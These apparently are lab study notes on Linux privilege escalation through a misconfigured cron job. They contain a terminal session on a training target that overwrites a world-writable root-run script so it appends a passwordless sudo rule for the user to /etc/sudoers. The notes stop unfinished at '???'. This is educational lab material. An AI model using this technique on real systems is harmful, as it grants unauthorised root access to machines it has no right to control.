# Exploiting Misconfigured Cron Jobs


**Cron Jobs**\
**Cron** = **Task Scheduling** utility\
Time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.\
An applications, or scripts that has been configured to be run repeatedly with **Cron** is known as a **Cron job**


### Practice

```bash
# On the browser
http://target.ine.local:8000

student@target:~$ whoami
student

student@target:~$ ls -al
total 12
drwxr-xr-x 1 student student 4096 Sep 23  2018 .
drwxr-xr-x 1 root    root    4096 Sep 23  2018 ..
-rw------- 1 root    root      26 Sep 23  2018 message

student@target:~$ pwd
/home/student

student@target:~$ cat message
cat: message: Permission denied

student@target:~$ cd /
student@target:/$

# grep utility to find path home/student/message
student@target:/$ grep -rnw /usr -e "/home/student/message"
/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message

student@target:/$ ls -al /tmp
total 12
drwxrwxrwt 1 root root 4096 Jul 18 07:03 .
drwxr-xr-x 1 root root 4096 Jul 18 06:46 ..
-rw-r--r-- 1 root root   26 Jul 18 07:03 message
-rw-r--r-- 1 root root    0 Jul 18 06:46 ready

student@target:/$ cat /tmp/message
Hey!! you are not root :(


student@target:/$ ls -al /usr/local/share/copy.sh
-rwxrwxrwx 1 root root 74 Sep 23  2018 /usr/local/share/copy.sh

student@target:/$ cat usr/local/share/copy.sh
#! /bin/bash
cp /home/student/message /tmp/message
chmod 644 /tmp/message

tudent@target:/$ printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
student@target:/$ cat /usr/local/share/copy.sh
#!/bin/bash
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoersstudent@target:/$

???
```